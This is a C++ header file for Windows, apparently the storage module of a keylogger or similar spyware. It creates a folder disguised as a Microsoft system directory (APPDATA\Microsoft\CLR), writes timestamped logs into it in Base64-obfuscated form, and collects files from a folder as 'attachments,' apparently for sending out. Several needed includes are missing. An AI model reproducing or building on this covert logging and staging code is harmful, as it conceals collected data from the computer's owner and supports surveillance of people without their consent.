#pragma once

#ifndef IO_H
#define IO_H

#include <string>
#include <cstdlib>
#include <fstream>
#include <windows.h>

#include "Helper.h"
#include "Base64.h"

namespace IO
{
	std::string GetPath(const bool append_seperator=false)
	{
		std::string dir(getenv("APPDATA"));
		std::string full = dir + "\\Microsoft\\CLR";
		return full + (append_seperator ? "\\" : "");
	}

	bool MkOneDir(const std::string& path)
	{
		return (bool)CreateDirectory(path.c_str(), NULL) || GetLastError() == ERROR_ALREADY_EXISTS;
	}

	bool MKDir(std::string path)
	{
		for (char& c : path)
		{
			if (c == '\\')
			{
				c = '\0';
				if (!MkOneDir(path))
					return false;
				c = '\\';
			}
		}
		return true;
	}

	template <class T>
	std::string WriteLog(const T& t)
	{
		std::string path = GetPath(true);
		Helper::DateTime dt;
		std::string name = dt.GetDateTimeString("_") + ".log";

		try
		{
			std::ofstream out(path + name);
			if (!out) return "";
			std::ostringstream s;
			s << "[" << dt.GetDateTimeString() << "]" << std::endl <<
				t << std::endl;

			std::string data = Base64::EncryptB64(s.str());
			out << data;

			if (!out) return "";
			out.close();
			return name;
		}
		catch (...)
		{
			return "";
		}
	}

	std::vector<std::string> GetAttatchments(const std::string &path)
	{
		std::vector<std::string> ret;
		for (const auto &entry : std::filesystem::directory_iterator(path))
		{
			std::cout << entry.path() << std::endl;
			ret.push_back(Helper::ToString(entry.path()));
		}

		return ret;
	}
}

#endif

